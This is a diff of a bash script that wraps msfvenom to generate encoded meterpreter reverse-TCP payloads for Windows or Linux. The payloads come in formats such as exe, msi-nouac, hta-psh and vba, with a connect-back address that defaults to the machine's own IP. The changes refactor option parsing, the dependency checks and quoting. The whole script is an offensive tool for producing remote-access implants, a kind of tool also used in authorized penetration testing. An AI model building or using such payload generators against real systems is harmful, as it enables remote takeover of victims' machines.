@@ -6,7 +6,7 @@ check_deps() {
     for d in "${deps[@]}"; do
         if [[ -z $(command -v "$d") ]]; then
             # Force absolute path
-            if [[ ! -f "/$d" ]]; then
+            if [[ ! -e "/$d" ]]; then
                 err "$d was not found"
                 missing="true"
             fi
@@ -21,8 +21,8 @@ info() { echo -e "${color:+\e[37m}[*] $*\e[0m"; }
 long_opt() {
     local arg shift="0"
     case "$1" in
-        "--"*"="*) arg="${1#*=}"; [[ -n $arg ]] || usage 127 ;;
-        *) shift="1"; shift; [[ $# -gt 0 ]] || usage 127; arg="$1" ;;
+        "--"*"="*) arg="${1#*=}"; [[ -n $arg ]] || return 127 ;;
+        *) shift="1"; shift; [[ $# -gt 0 ]] || return 127; arg="$1" ;;
     esac
     echo "$arg"
     return $shift
@@ -33,16 +33,17 @@ warn() { echo -e "${color:+\e[33m}[-] $*\e[0m"; }
 
 default_ip() {
     ip -o a | \
-    perl -lne 'if (!/ lo / && /inet ([^\/]+)/) {print $1; exit}'
+    grep -Psv "\s(docker\d+|lo)\s" | grep -ioPs "inet\s+\K[^\/]+"
 }
 
 usage() {
     cat <<EOF
 Usage: ${0##*/} [OPTIONS] <format> [payload options]
 
-Simplify generating a meterpreter payload
+DESCRIPTION
+    Simplify generating a meterpreter payload.
 
-Options:
+OPTIONS
     -h, --help         Display this help message
     -i, --ip=IP        Connect back to specified IP address (default:
                        $ip)
@@ -52,12 +53,12 @@ Options:
                        $port)
     -w, --windows      Create windows meterpreter (default behavior)
 
-Executable formats:
+EXECUTABLE FORMATS
     asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service,
     exe-small, hta-psh, loop-vbs, macho, msi, msi-nouac, osx-app, psh,
     psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, war
 
-Transform formats:
+TRANSFORM FORMATS
     bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl,
     pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication,
     vbscript
@@ -66,38 +67,46 @@ EOF
     exit "$1"
 }
 
-declare -a args deps
+declare -a args
 unset help
 color="true"
-deps+=("msfvenom")
-deps+=("perl")
 ip="$(default_ip)"
 os="windows"
 port=4444
 
-# Check for missing dependencies
-check_deps
-
 # Parse command line options
 while [[ $# -gt 0 ]]; do
     case "$1" in
-        "--") shift && args+=("$@") && break ;;
+        "--") shift; args+=("$@"); break ;;
         "-h"|"--help") help="true" ;;
-        "-i"|"--ip"*) ip="$(long_opt "$@")" || shift ;;
+        "-i"|"--ip"*) ip="$(long_opt "$@")" ;;
         "-l"|"--linux") os="linux/x86" ;;
         "--no-color") unset color ;;
-        "-p"|"--port"*) port="$(long_opt "$@")" || shift ;;
+        "-p"|"--port"*) port="$(long_opt "$@")" ;;
         "-w"|"--windows") os="windows" ;;
         *) args+=("$1") ;;
+    esac
+    case "$?" in
+        0) ;;
+        1) shift ;;
+        *) usage $? ;;
     esac
     shift
 done
 [[ ${#args[@]} -eq 0 ]] || set -- "${args[@]}"
 
-# Check for valid params
+# Help info
 [[ -z $help ]] || usage 0
+
+# Check for missing dependencies
+declare -a deps
+deps+=("grep")
+deps+=("msfvenom")
+check_deps
+
+# Check for valid params
 [[ $# -eq 1 ]] || usage 1
 
-msfvenom -b "\x00" -e x86/shikata_ga_nai -f $1 \
-    -p $os/meterpreter/reverse_tcp LHOST=$ip LPORT=$port ${@:2} \
-    >meterpreter.$1
+msfvenom -b "\x00" -e x86/shikata_ga_nai -f "$1" \
+    -p "$os/meterpreter/reverse_tcp" LHOST="$ip" LPORT="$port" \
+    "${@:2}" >"meterpreter.$1"
